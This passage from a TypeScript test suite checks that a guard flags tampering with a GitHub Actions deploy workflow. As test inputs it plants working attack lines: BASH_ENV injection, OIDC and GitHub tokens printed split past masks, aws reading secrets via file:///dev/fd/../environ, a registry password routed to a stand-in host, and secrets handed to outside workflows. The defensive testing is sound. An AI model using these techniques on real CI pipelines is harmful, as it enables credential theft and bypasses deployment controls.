    ).toEqual([at('DPW-10', 'prod (The fast re-check)', ENV)])
    const mode = `          MODE: \${{ needs.gate.outputs.mode }}\n          TARGET: \${{ needs.gate.outputs.target }}\n          RECORD_ID`
    expect(credentialed(plant(mode, mode.replace('needs.gate.outputs.mode', 'needs.prod-gate.outputs.mode')))).toEqual([
      at('DPW-10', 'prod (The fast re-check)', ENV),
    ])
    expect(
      credentialed(
        plant(
          `          SHA: \${{ github.sha }}\n`,
          `          SHA: \${{ needs.gate.outputs.previous_prod_commit }}\n`,
          "      - name: main's own CI\n",
        ),
      ),
    ).toEqual([at('DPW-10', "prod-gate (main's own CI)", ENV)])
    expect(
      credentialed(
        plant(
          `          NONPROD_DIGEST: \${{ needs.nonprod.outputs.digest }}\n        run: |\n          set -euo pipefail\n          # history.ts`,
          `          NONPROD_DIGEST: \${{ needs.build.outputs.digest }}\n        run: |\n          set -euo pipefail\n          # history.ts`,
        ),
      ),
    ).toEqual([at('DPW-10', 'prod-gate (The prod gate)', ENV)])
    // A record job's decision reads SMOKE from its env:, held as well.
    expect(
      credentialed(
        plant(
          `          SMOKE: \${{ needs.smoke-nonprod.result }}\n`,
          `          SMOKE: \${{ needs.nonprod.result }}\n`,
          job('record-nonprod'),
        ),
      ),
    ).toEqual([at('DPW-10', 'record-nonprod (Write the record)', ENV)])
    // A job's outputs are its steps' as named: one swapped for another of the plan's is found.
    expect(
      credentialed(
        plant(
          `      rollback_prod: \${{ steps.plan.outputs.rollback_prod }}\n`,
          `      rollback_prod: \${{ steps.plan.outputs.rollback_nonprod }}\n`,
          job('gate'),
        ),
      ),
    ).toEqual([at('DPW-10', 'gate', 'outputs only what JOB_OUTPUTS names, each from the step it names')])
    // A step of its own can't take the id a job's outputs read: every step's id is the guard's.
    expect(
      credentialed(
        plant(
          '      - name: Plan\n        id: plan\n',
          '      - name: Forge\n        id: plan\n        run: echo\n      - name: Plan\n        id: plan0\n',
          job('gate'),
        ),
      ),
    ).toEqual([
      at(
        'DPW-10',
        'gate',
        'runs the steps JOB_STEPS names, in order, each by its name with the action it names (a run step none): no step of its own before, between or after them, and none dropped or moved',
      ),
      at(
        'DPW-10',
        'gate (Forge)',
        "names each step's id as STEP_IDS does, so every output a job hands on is its pinned step's",
      ),
      at(
        'DPW-10',
        'gate (Plan)',
        "names each step's id as STEP_IDS does, so every output a job hands on is its pinned step's",
      ),
    ])
  }, 30_000)

  // FLOW-A1-04: the gate's outputs are its plan's; a line of its own before PLAN_CALL ends the step with
  // outputs of its own, and one after it writes a key again, which the runner reads last.
  it('pins the gate’s steps and every run that writes an output (FLOW-A1-04)', () => {
    const plan = `          ${PLAN_CALL}\n`
    for (const planted of [
      addedBefore('gate', 'Plan', plan, lines('echo "rollback_prod=true" >>"$GITHUB_OUTPUT"', 'exit 0')),
      plant(
        '          } >>"$GITHUB_STEP_SUMMARY"\n\n  # The build',
        '          } >>"$GITHUB_STEP_SUMMARY"\n          echo "rollback_prod=true" >>"$GITHUB_OUTPUT"\n\n  # The build',
      ),
    ]) {
      expect(
        gateFindings(planted, environments, PROFILES.nonprod.holdsRealData, protectEnvironments, AGENT_MARKERS),
      ).toContain(at('DPW-09', 'gate (Plan)', PINNED_09))
      expect(prodPathFindings(planted)).toContain(at('DPW-08', 'gate (Plan)', OUTPUT_PINNED))
    }
    expect(
      gateFindings(
        addedBefore('gate', 'The release, migration and restore records', '          mkdir -p', lines('exit 0')),
        environments,
        PROFILES.nonprod.holdsRealData,
        protectEnvironments,
        AGENT_MARKERS,
      ),
    ).toEqual([at('DPW-09', 'gate (The release, migration and restore records)', PINNED_09)])
    expect(
      gateFindings(
        addedBefore('gate', "main's ruleset is live", '          RULES=', lines('exit 0')),
        environments,
        PROFILES.nonprod.holdsRealData,
        protectEnvironments,
        AGENT_MARKERS,
      ),
    ).toEqual([at('DPW-09', "gate (main's ruleset is live)", PINNED_09)])
    // The same class beyond the gate: a smoke ended early, a read-back, a release or prod-gate's records
    // forged, and a step of its own writing an output.
    expect(prodPathFindings(addedBefore('smoke-nonprod', 'Smoke', "          printf '%s'", lines('exit 0')))).toEqual([
      at('DPW-08', 'smoke-nonprod (Smoke)', PINNED_08),
    ])
    // An if: that skips a pinned step passes its job as surely as an early exit 0 does.
    expect(
      prodPathFindings(
        plant('      - name: Smoke\n', `      - name: Smoke\n        if: \${{ false }}\n`, job('smoke-prod')),
      ),
    ).toEqual([at('DPW-08', 'smoke-prod (Smoke)', PINNED_08)])
    expect(
      prodPathFindings(
        plant(
          `        if: \${{ needs.gate.outputs.target == 'prod' }}\n`,
          `        if: \${{ needs.gate.outputs.target == 'nothing' }}\n`,
          job('prod'),
        ),
      ),
    ).toEqual([at('DPW-08', 'prod (Services are about to change)', PINNED_08)])
    expect(
      prodPathFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          lines(`echo 'readback={}' >>"$GITHUB_OUTPUT"`),
        ),
      ),
    ).toEqual([
      at('DPW-08', 'nonprod (Read back what runs)', PINNED_08),
      at('DPW-08', 'nonprod (Read back what runs)', OUTPUT_PINNED),
    ])
    expect(
      prodPathFindings(
        addedBefore('rollback-prod', "This run's release and the previous one", '          {\n', lines('exit 0')),
      ),
    ).toContain(at('DPW-08', "rollback-prod (This run's release and the previous one)", PINNED_08))
    expect(
      prodPathFindings(addedBefore('prod-gate', "Prod's release records", '          mkdir -p', lines('exit 0'))),
    ).toEqual([at('DPW-08', "prod-gate (Prod's release records)", PINNED_08)])
    expect(
      prodPathFindings(
        plant(
          '      - name: Deploy Services\n',
          '      - name: Go\n        run: echo "go=true" >>"$GITHUB_OUTPUT"\n      - name: Deploy Services\n',
          job('nonprod'),
        ),
      ),
    ).toEqual([at('DPW-08', 'nonprod (Go)', OUTPUT_PINNED)])
  }, 30_000)

  // YAML-A1-01 and YAML-A1-02: an env: (or with: or outputs:) written as one expression is the whole mapping
  // to GitHub (BASH_ENV, say, run by bash before the step's first line) and none to the reader.
  it('refuses an env:, with: or outputs: written as one expression (YAML-A1-01, YAML-A1-02)', () => {
    const value = `\${{ fromJSON('{"BASH_ENV":"$(touch $RUNNER_TEMP/marker)"}') }}`
    expect(
      credentialed(plant('        id: mark\n', `        id: mark\n        env: ${value}\n`, job('nonprod'))),
    ).toEqual([at('DPW-10', `nonprod (${mark})`, MAPPING)])
    expect(
      credentialed(plant('    cache-mode: none\n', `    cache-mode: none\n    env: ${value}\n`, job('record-nonprod'))),
    ).toEqual([at('DPW-10', 'record-nonprod', ENV), at('DPW-10', 'record-nonprod', MAPPING)])
    expect(
      credentialed(
        plant(
          `        with:\n          artifact-ids: \${{ needs.synth.outputs.assembly }}\n          path: \${{ runner.temp }}/assembly\n`,
          `        with: \${{ fromJSON('{"artifact-ids":"","path":"x"}') }}\n`,
          job('nonprod'),
        ),
      ),
    ).toContain(at('DPW-10', 'nonprod (Download the assembly)', MAPPING))
  }, 30_000)
})

describe('Round 4, attack 2: the ways past the allowlist (DPW-02, DPW-10)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const STEPS =
    'runs the steps JOB_STEPS names, in order, each by its name with the action it names (a run step none): no step of its own before, between or after them, and none dropped or moved'
  const FILES =
    'names no GITHUB_ENV, GITHUB_PATH or GITHUB_STATE, in any job: no step hands a later one of its job a variable (BASH_ENV, say, which bash reads before a pinned run), a folder to search first or a state'
  const SETS_INPUT =
    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads but by a command its step's pinned run holds (TOKEN also on its own lines), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
  const BLOCK_SCALARS = `${DEPLOY}: DPW-02 writes a block scalar only as a run:, never as an env: entry, an output, an input or any other value, whose last line break GitHub keeps and the guard's reader drops`
  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')
  // deploy.yml with a run step of its own, named name, before one of a job's steps.
  const stepBefore = (id: string, before: string, name: string, ...run: string[]) =>
    plant(
      `      - name: ${before}\n`,
      `      - name: ${name}\n        run: |\n${lines(...run)}      - name: ${before}\n`,
      job(id),
    )

  // YAML-A2-01: a step of its own, before a pinned run in a job that holds no credentials, writes BASH_ENV to
  // GITHUB_ENV, so bash runs a file of its own before the smoke, the gate's plan or prod-gate's read of
  // main's CI (a trap that exits 0, or writes an output again), though every line of the pinned run is as
  // written. Every job's steps are now the guard's, and no run of any job names a file command.
  it('holds every job to its own steps, none naming GITHUB_ENV, GITHUB_PATH or GITHUB_STATE (YAML-A2-01)', () => {
    const bashEnv = [
      `echo "trap 'exit 0' EXIT" >"$RUNNER_TEMP/env.sh"`,
      'echo "BASH_ENV=$RUNNER_TEMP/env.sh" >>"$GITHUB_ENV"',
    ]
    // One of each class of job: the smokes, the gates, a job that runs repository code by design, a record
    // job and a credentialed job.
    for (const [id, before] of [
      ['smoke-prod', 'Smoke'],
      ['gate', 'Plan'],
      ['prod-gate', "main's own CI"],
      ['build', 'Build the image'],
      ['record-nonprod', 'Write the record'],
      ['nonprod', 'What runs'],
    ] as const) {
      const found = credentialed(stepBefore(id, before, 'Prepare', ...bashEnv))
      expect(found, id).toContain(at('DPW-10', id, STEPS))
      expect(found, id).toContain(at('DPW-10', `${id} (Prepare)`, FILES))
    }
    // A step of its own that names no file command, and a step dropped, moved or run in place of an action.
    expect(credentialed(stepBefore('smoke-prod', 'Smoke', 'Prepare', 'echo ready'))).toEqual([
      at('DPW-10', 'smoke-prod', STEPS),
    ])
    expect(credentialed(removedStep('smoke-prod', 'Node, from .nvmrc'))).toEqual([at('DPW-10', 'smoke-prod', STEPS)])
    expect(credentialed(movedStep('prod-gate', "main's own CI", "Prod's release records"))).toEqual([
      at('DPW-10', 'prod-gate', STEPS),
    ])
    const node = stepText(deployText, 'smoke-prod', 'Node, from .nvmrc')
    expect(
      credentialed(
        withText(
          DEPLOY,
          edited(deployText, node, '      - name: Node, from .nvmrc\n        run: echo ready\n', job('smoke-prod')),
        ),
      ),
    ).toEqual([at('DPW-10', 'smoke-prod', STEPS)])
    // A file command in a step the job has, in any spelling, a comment included.
    const client = '          sudo apt-get update\n'
    for (const line of [
      'echo "$RUNNER_TEMP/bin" >>"$GITHUB_PATH"',
      `echo "BASH_ENV=$RUNNER_TEMP/env.sh" >>"\${GITHUB_ENV}"`,
      'echo "x=1" >>"$GITHUB_STATE"',
      '# GITHUB_ENV',
    ]) {
      expect(credentialed(addedBefore('build', 'The PostgreSQL client', client, lines(line))), line).toEqual([
        at('DPW-10', 'build (The PostgreSQL client)', FILES),
      ])
    }
  }, 30_000)

  // YAML-A2-02: an env: value written as a literal block scalar keeps its last line break in GitHub's reading
  // (YAML's clip chomping), which the reader drops, so TARGET reaches prod's fast re-check as prod and a
  // newline and its attempt, ancestry and digest checks are skipped, though the value equals STEP_ENVS'.
  it('refuses a block scalar on any key but run:, whose last line break GitHub keeps (YAML-A2-02)', () => {
    const block = (from: string, key: string, value: string, indicator: string, after: string) =>
      plant(
        from,
        from.replace(`${key}: ${value}`, `${key}: ${indicator}\n${' '.repeat(from.indexOf(key) + 2)}${value}`),
        after,
      )
    for (const indicator of ['|', '|+', '|-']) {
      // A step's env:, as the attack wrote it, which the env pin alone doesn't see.
      const target = `          TARGET: \${{ needs.gate.outputs.target }}\n`
      const planted = block(target, 'TARGET', `\${{ needs.gate.outputs.target }}`, indicator, job('prod'))
      expect(permissionFindings(planted), indicator).toEqual([BLOCK_SCALARS])
      expect(credentialed(planted), indicator).toEqual([])
      // A job's env:, a job's output, an action's input and a concurrency group.
      for (const [from, key, value, after] of [
        ['      STAGE: nonprod\n', 'STAGE', 'nonprod', job('nonprod')],
        [`      mode: \${{ steps.plan.outputs.mode }}\n`, 'mode', `\${{ steps.plan.outputs.mode }}`, job('gate')],
        ['          persist-credentials: false\n', 'persist-credentials', 'false', job('smoke-prod')],
        ['      group: deploy-nonprod\n', 'group', 'deploy-nonprod', job('nonprod')],
      ] as const) {
        expect(permissionFindings(block(from, key, value, indicator, after)), `${key} ${indicator}`).toContain(
          BLOCK_SCALARS,
        )
      }
    }
  })

  // FLOW-A2-01: an aws value built from a variable a run's own lines set, whole ("$CLUSTER" set to file://…)
  // or joined to a literal key (imageTag$X with X set to @=file://…), makes aws load a local file (the
  // registry login's auth file, or the environment through /dev/fd/../environ), though the guard read no
  // scheme in its literal text.
  it('builds no aws value from a variable its own lines set (FLOW-A2-01)', () => {
    const forward = 'Deploy Platform, Data and Tasks'
    const assembly = '          ASSEMBLY="$RUNNER_TEMP/assembly"\n'
    const describeServices = (value: string) =>
      `STATUS=$(get aws ecs describe-services --cluster ${value} --services hearth-nonprod-api --query 'services[0].status' --output text)`
    const inForward = (...each: string[]) => credentialed(addedBefore('nonprod', forward, assembly, lines(...each)))
    for (const set of ['CLUSTER=file://$XDG_RUNTIME_DIR/containers/auth.json', 'CLUSTER=file:///dev/fd/../environ']) {
      expect(inForward(set, describeServices('"$CLUSTER"')), set).toContain(
        at('DPW-10', `nonprod (${forward})`, SETS_INPUT),
      )
    }
    expect(
      inForward(
        'X=@=file://$XDG_RUNTIME_DIR/containers/auth.json',
        `TAGS=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=$DIGEST,imageTag$X" --query 'imageDetails[0].imageTags' --output json)`,
      ),
    ).toContain(at('DPW-10', `nonprod (${forward})`, HELD))
    expect(
      credentialed(
        addedBefore(
          'nonprod',
          'Deploy Services',
          assembly,
          lines(
            'TASK_ARNS=("file:///dev/fd/../environ")',
            `ENDED=$(get aws ecs describe-tasks --cluster "hearth-$STAGE" --tasks "\${TASK_ARNS[@]}" --query 'tasks[0].lastStatus' --output text)`,
          ),
        ),
      ),
    ).toContain(at('DPW-10', 'nonprod (Deploy Services)', SETS_INPUT))
    // Every other name an aws value reads, set on a line of its own by any setter the table admits.
    for (const set of [
      'MIGRATE_TD=x',
      'NET_MIGRATE=x',
      'TOKEN=x',
      'GROUP_ARN=x',
      'BALANCER=x',
      'DIGEST=x',
      'ROLE=x',
      'for ROLE in x; do echo "$ROLE"; done',
      'mapfile -t TASK_ARNS < <(echo x)',
    ]) {
      expect(inForward(set), set).toContain(at('DPW-10', `nonprod (${forward})`, SETS_INPUT))
    }
    // Any other word holding an expansion, even of a name the guard pins, or after a literal part.
    for (const value of ['"x-$STAGE"', `"hearth-\${STAGE}"`, '"$CLUSTER$STAGE"', '"arn:$STAGE"']) {
      expect(inForward(describeServices(value)), value).toContain(at('DPW-10', `nonprod (${forward})`, HELD))
    }
    // The workflow's own words and its token's line pass every layer but the pin, which now holds this step
    // whole too.
    const pinned = at('DPW-10', `nonprod (${forward})`, PINNED_10)
    expect(inForward(describeServices('"hearth-$STAGE"'))).toEqual([pinned])
    expect(inForward('TOKEN="probe-nonprod-deploy-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"')).toEqual([pinned])
  }, 30_000)
})

describe('Round 4, attack 3: the ways past the allowlist (DPW-02, DPW-07, DPW-10)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const SETS_INPUT =
    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads but by a command its step's pinned run holds (TOKEN also on its own lines), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
  const OWN =
    "expands on its own lines only a name its step's or job's env: sets (never GH_TOKEN, which gh reads itself), one its run sets, a function's argument, the last status or the runner's outputs, summary, folder and run ids, so no line reads the OIDC request token or another credential the runner hands it"
  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')
  const assembly = '          ASSEMBLY="$RUNNER_TEMP/assembly"\n'
  const previous = '          ASSEMBLY="$RUNNER_TEMP/assembly-previous"\n'

  // COMMANDS-A3-01: an own line sets ACCOUNT_ID, which the one line allowed to set REGISTRY reads, so the
  // canonical login sends the registry password to a host of its own choosing; ACCOUNT_ID was set by a step's
  // env: in the push and the mask alone, and pinned nowhere else.
  it('lets no line of its own set the account id the registry is built from (COMMANDS-A3-01)', () => {
    const where = 'nonprod (Roll back to the target)'
    const login = lines(
      'ACCOUNT_ID=host.invalid.example/x',
      'REGISTRY="$ACCOUNT_ID.dkr.ecr.ap-southeast-1.amazonaws.com"',
      'get aws ecr get-login-password --region ap-southeast-1 | skopeo login --username AWS --password-stdin "$REGISTRY" 2>&1 | mask',
    )
    expect(credentialed(addedBefore('nonprod', 'Roll back to the target', assembly, login))).toEqual([
      at('DPW-10', where, PINNED_10),
      at('DPW-10', where, SETS_INPUT),
    ])
    // Any setter the table admits, in any step, the push's own included.
    for (const set of ['ACCOUNT_ID=x', 'for ACCOUNT_ID in x; do echo "$ACCOUNT_ID"; done']) {
      expect(credentialed(addedBefore('nonprod', 'Deploy Services', assembly, lines(set))), set).toContain(
        at('DPW-10', 'nonprod (Deploy Services)', SETS_INPUT),
      )
    }
    const registry = '          REGISTRY="$ACCOUNT_ID.dkr.ecr.ap-southeast-1.amazonaws.com"\n'
    expect(credentialed(addedBefore('prod', 'Push the image', registry, lines('ACCOUNT_ID=x')))).toContain(
      at('DPW-10', 'prod (Push the image)', SETS_INPUT),
    )
  })

  // FLOW-A3-01: a credentialed run's own line hands jq the OIDC request token, which the runner puts in every
  // run step of a job with id-token: write, and jq prints it split or sliced, in pieces no mask matches.
  it('expands on a credentialed or record run’s own lines only the names it owns (FLOW-A3-01)', () => {
    const split = `jq -nc --arg u "$ACTIONS_ID_TOKEN_REQUEST_URL" --arg t "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" '[$u, ($t | split("."))]'`
    const slice = `jq -n -r --arg t "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" '$t | .[0:40], .[40:]'`
    for (const [id, name, anchor, line] of [
      ['nonprod', 'Deploy Services', assembly, split],
      ['prod', 'Take the restore stage down', assembly, slice],
      ['rollback-nonprod', 'Roll back Tasks and Services', previous, split],
      ['rollback-prod', 'Roll back Tasks and Services', previous, split],
    ] as const) {
      const planted = addedBefore(id, name, anchor, lines(line))
      expect(maskingFindings(planted), `${id} ${name}`).toEqual([at('DPW-07', `${id} (${name})`, OWN)])
      expect(credentialed(planted), `${id} ${name}`).toEqual([at('DPW-10', `${id} (${name})`, PINNED_10)])
    }
    // The URL through a name of its own, the GitHub token gh reads itself, and a record job's run.
    expect(
      maskingFindings(addedBefore('nonprod', 'Deploy Services', assembly, lines('U="$ACTIONS_ID_TOKEN_REQUEST_URL"'))),
    ).toEqual([at('DPW-07', 'nonprod (Deploy Services)', OWN)])
    const tokenSplit = `jq -nc --arg t "$GH_TOKEN" '$t | split("")'`
    expect(
      maskingFindings(
        addedBefore('nonprod', 'The fast re-check', '          newest=$(newest_release nonprod)\n', lines(tokenSplit)),
      ),
    ).toEqual([at('DPW-07', 'nonprod (The fast re-check)', OWN)])
    const url = '          URL="$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"\n'
    expect(maskingFindings(addedBefore('record-prod', 'Write the record', url, lines(tokenSplit)))).toEqual([
      at('DPW-07', 'record-prod (Write the record)', OWN),
    ])
    // A job that holds neither credentials nor records is no concern of this rule.
    expect(
      maskingFindings(
        plant(
          'node infra/scripts/deploy/smoke.ts',
          `jq -n --arg t "$GITHUB_TOKEN" '$t' >/dev/null\n          node infra/scripts/deploy/smoke.ts`,
          job('smoke-nonprod'),
        ),
      ),
    ).toEqual([])
  })

  // FLOW-A3-02, and FLOW-A3-01's class: a credentialed run's own lines capture an AWS answer and print it split,
  // past both masks. Every run of the five credentialed jobs is now pinned whole, under its own if:, so none has
  // a line of its own at all.
  it('pins every run of a job that holds the deploy role, so none has a line of its own (FLOW-A3-02)', () => {
    const account = lines(
      `ID=$(get aws cloudformation describe-stacks --stack-name "Hearth-$STAGE-Services" --query 'Stacks[0].StackId' --output text)`,
      `jq -nc --arg i "$ID" '$i | split(":")[4] | split("")'`,
    )
    expect(credentialed(addedBefore('nonprod', 'Deploy Services', assembly, account))).toEqual([
      at('DPW-10', 'nonprod (Deploy Services)', PINNED_10),
    ])
    // A harmless line at the end of every run of each credentialed job is the finding of the rule that pins it.
    const finders = {
      'DPW-08': [prodPathFindings, PINNED_08],
      'DPW-10': [credentialed, PINNED_10],
      'DPW-13': [releaseFindings, PINNED_13],
    } as const
    for (const jobId of Object.keys(ENVIRONMENT_JOBS)) {
      const each = workflowJobs(deployText).find(job => job.id === jobId)
      const runs = (each === undefined ? [] : parsedSteps(each)).filter(step => step.run !== undefined)
      expect(runs.length, jobId).toBeGreaterThan(0)
      for (const { name = '' } of runs) {
        const rule = PINNED_RUNS()[jobId]?.[name]?.rule
        expect(rule, `${jobId} (${name})`).toBeDefined()
        if (rule === undefined || rule === 'DPW-09') continue
        const step = stepText(deployText, jobId, name)
        const one = /^ {8}run: (?![|>])(.*)\n/m.exec(step)
        const to =
          one === null
            ? `${step}          echo ready\n`
            : step.replace(one[0], `        run: |\n          ${one[1]}\n          echo ready\n`)
        const [finder, text] = finders[rule]
        expect(finder(withText(DEPLOY, edited(deployText, step, to, job(jobId)))), `${jobId} (${name})`).toContain(
          at(rule, `${jobId} (${name})`, text),
        )
      }
    }
    // A run step of a credentialed job that PINNED_RUNS doesn't name, and a pinned step under an if: of its own.
    const renamed = plant('      - name: Deploy Services\n', '      - name: Deploy the services\n', job('nonprod'))
    expect(credentialed(renamed)).toContain(at('DPW-10', 'nonprod (Deploy the services)', PINNED_10))
    expect(credentialed(renamed)).toContain(at('DPW-10', 'nonprod (Deploy Services)', PINNED_10))
    expect(
      credentialed(
        plant(
          `        if: \${{ needs.gate.outputs.mode == 'rollback' }}\n`,
          `        if: \${{ needs.gate.outputs.mode != 'deploy' }}\n`,
          '      - name: Roll back to the target\n',
        ),
      ),
    ).toContain(at('DPW-10', 'nonprod (Roll back to the target)', PINNED_10))
  }, 60_000)

  // A run pinned under another rule no longer lets its own lines set a name an aws value reads: only the
  // commands its pinned text holds may, so a line added to the read-back that sets one is this rule's finding
  // as well as its pin's.
  it('lets a pinned run’s own lines set a name an aws value reads only by the commands it pins', () => {
    const states = '              STATES=$(get aws elbv2 describe-target-health'
    expect(
      credentialed(
        addedBefore('nonprod', 'Read back what runs', states, '              GROUP_ARN=file:///dev/fd/../environ\n'),
      ),
    ).toContain(at('DPW-10', 'nonprod (Read back what runs)', SETS_INPUT))
  })

  // YAML-A3-01: another workflow's job calls a reusable workflow the guard never reads (another repository's,
  // or this one's at another ref) whose job names an environment or joins a deploy group, and can be handed
  // that environment's secrets.
  it('lets another workflow call only one of this repository’s at this commit, and hand it no secret (YAML-A3-01)', () => {
    const CALLS =
      'calls only another workflow of this repository at this commit (./.github/workflows/<file>.yml), never deploy.yml, one of another repository or one at another ref'
    const SECRETS = 'hands no secret to a called workflow'
    const ci = (id: string, rule: string) => `${CI}: DPW-02 ${id}: ${rule}`
    const extra = (...keys: string[]) =>
      plant('\njobs:\n', `\njobs:\n  extra:\n${keys.map(key => `    ${key}\n`).join('')}`, '', CI)
    const elsewhere =
      'uses: example-org/shared-workflows/.github/workflows/hold.yml@0123456789abcdef0123456789abcdef01234567'
    expect(permissionFindings(extra(elsewhere, 'secrets: inherit'))).toEqual([ci('extra', CALLS), ci('extra', SECRETS)])
    expect(
      permissionFindings(
        extra(
          elsewhere,
          'secrets:',
          `  ROLE: \${{ secrets.AWS_DEPLOY_ROLE }}`,
          `  ACCOUNT: \${{ secrets.AWS_ACCOUNT_ID }}`,
        ),
      ),
    ).toEqual([ci('extra', CALLS), ci('extra', SECRETS)])
    for (const uses of [
      elsewhere,
      'uses: example-org/example-repo/.github/workflows/secrets.yml@0123456789abcdef0123456789abcdef01234567',
      'uses: ./.github/workflows/missing.yml',
      'uses: ./.github/workflows/sub/secrets.yml',
      'uses: ./.github/workflows/secrets.yml@main',
      'uses: $/.github/workflows/secrets.yml',
      'uses: ./.github/workflows/deploy.yml',
    ]) {
      expect(permissionFindings(extra(uses)), uses).toEqual([ci('extra', CALLS)])
    }
    // ci.yml's own call, handed the secrets; and the same call from a job of its own, which passes.
    const own = '    uses: ./.github/workflows/secrets.yml\n'
    expect(permissionFindings(plant(own, `${own}    secrets: inherit\n`, '', CI))).toEqual([ci('secrets', SECRETS)])
    expect(permissionFindings(extra('uses: ./.github/workflows/secrets.yml'))).toEqual([])
  })
})

describe('Round 5, attack 1: the ways past the allowlist (DPW-04, DPW-07, DPW-08, DPW-12 to DPW-14)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const lines = (...each: string[]) => each.map(line => `          ${line}\n`).join('')
  const synthLine = `          npm run synth -w @hearth/infra -- -c release="$COMMIT:$DIGEST" "\${CONTEXT[@]}" -o "$RUNNER_TEMP/assembly"\n`
  const synthStep = 'synth (Synthesise the release)'

  // EXPAND-A1-01 to A1-03, COMMANDS-A1-01 and A1-02: build's and synth's runs had lines of their own, which the
  // table and the text rules read, so env handed to a program as a word built from an expansion, the synth's
  // words quoted, npm's and the CLI's own aliases for its command and flag (run-script, synthesize, --context),
  // GITHUB_ENV's file reached through its folder, and a script's name bash joins from quoted or expanded parts
  // all passed. Every run of build and synth is now pinned whole too, so no run of deploy.yml has a line of its
  // own.
  it('pins every run of build and synth whole, so none has a line of its own (EXPAND-A1-01 to A1-03, COMMANDS-A1-01, A1-02)', () => {
    const ahead = (added: string) => addedBefore('synth', 'Synthesise the release', synthLine, added)
    const instead = (to: string) => plant(synthLine, to, job('synth'))
    for (const [what, planted] of [
      ['env by an expanded word', ahead(lines('E=en', `xargs "\${E}v" </dev/null`))],
      ['env by a quoted split', ahead(lines('E=e""nv', 'xargs "$E" </dev/null'))],
      ['printenv by an expanded word', ahead(lines('P=print', `xargs "\${P}env" </dev/null`))],
      ['env through find', ahead(lines('E=en', `find /dev/null -maxdepth 0 -exec "\${E}v" ';'`))],
      [
        'the step file by its folder',
        ahead(
          lines(
            `echo 'exit 0' >"$RUNNER_TEMP/bash-env"`,
            `FILE=$(find "$RUNNER_TEMP/_runner_file_commands" -name 'set_env_*')`,
            'echo "BASH_ENV=$RUNNER_TEMP/bash-env" >>"$FILE"',
          ),
        ),
      ],
      [
        'quoted words',
        instead(
          lines(
            'npm run "synth" -w @hearth/infra -- -c "release=$COMMIT:$DIGEST" -c "drill=break:nonprod" -o "$RUNNER_TEMP/assembly"',
          ),
        ),
      ],
      ['synth:ci quoted', instead(lines('npm run "synth":ci -w @hearth/infra -- -o "$RUNNER_TEMP/assembly"'))],
      [
        'run-script and --context',
        instead(
          lines(
            'npm run-script synth -w @hearth/infra -- --context release="$COMMIT:$DIGEST" --context drill=break:nonprod -o "$RUNNER_TEMP/assembly"',
          ),
        ),
      ],
      [
        'cdk synthesize',
        instead(
          lines(
            `npx -w @hearth/infra cdk synthesize --app 'node bin/workload.ts' --context release="$COMMIT:$DIGEST" --context drill=break:nonprod -o "$RUNNER_TEMP/assembly"`,
          ),
        ),
      ],
    ] as const) {
      expect(releaseFindings(planted), what).toContain(at('DPW-13', synthStep, PINNED_13))
    }
    const check = '          IMAGE=hearth-server:build scripts/check-server.sh\n'
    for (const added of [
      lines('node scripts/owner-"bootstrap".ts set-up --database hearth'),
      lines('B=bootstrap', 'node "scripts/owner-$B.ts" set-up --database hearth'),
    ]) {
      expect(releaseFindings(addedBefore('build', 'Check the image', check, added)), added).toContain(
        at('DPW-13', 'build (Check the image)', PINNED_13),
      )
    }
    // Each synth step's folder is pinned with its run: the release's synth run in another checkout's folder.
    expect(
      releaseFindings(
        plant(
          '        working-directory: release\n        env:\n',
          '        working-directory: previous-nonprod\n        env:\n',
          job('synth'),
        ),
      ),
    ).toContain(at('DPW-13', synthStep, PINNED_13))
  })

  // The same class beyond build and synth: the gate's read of its pull request's checks and prod-gate's wait
  // for main's CI and its call were held by run, not by their if:, so a step skipped under an if: of its own
  // passed. Every run of every job is now one PINNED_RUNS pins whole, under its own if: and in its own folder.
  it('pins every run of deploy.yml whole, under its own if:, so none has a line of its own', () => {
    const finders = {
      'DPW-08': [prodPathFindings, PINNED_08],
      'DPW-09': [
        (planted: ReadonlyMap<string, string>) =>
          gateFindings(planted, environments, PROFILES.nonprod.holdsRealData, protectEnvironments, AGENT_MARKERS),
        PINNED_09,
      ],
      'DPW-10': [
        (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile),
        PINNED_10,
      ],
      'DPW-13': [releaseFindings, PINNED_13],
    } as const
    for (const each of workflowJobs(deployText)) {
      for (const { name = '' } of parsedSteps(each).filter(step => step.run !== undefined)) {
        const rule = PINNED_RUNS()[each.id]?.[name]?.rule
        expect(rule, `${each.id} (${name})`).toBeDefined()
        if (rule === undefined) continue
        const step = stepText(deployText, each.id, name)
        const one = /^ {8}run: (?![|>])(.*)\n/m.exec(step)
        const to =
          one === null
            ? `${step}          echo ready\n`
            : step.replace(one[0], `        run: |\n          ${one[1]}\n          echo ready\n`)
        const [finder, text] = finders[rule]
        expect(finder(withText(DEPLOY, edited(deployText, step, to, job(each.id)))), `${each.id} (${name})`).toContain(
          at(rule, `${each.id} (${name})`, text),
        )
      }
    }
    // A step skipped under an if: of its own, and one whose if: is gone.
    const pull = '      - name: The pull request that made this commit, and its checks\n'
    expect(prodPathFindings(plant(pull, `${pull}        if: \${{ false }}\n`, job('gate')))).toContain(
      at('DPW-08', 'gate (The pull request that made this commit, and its checks)', PINNED_08),
    )
    const prodGate = '      - name: The prod gate\n'
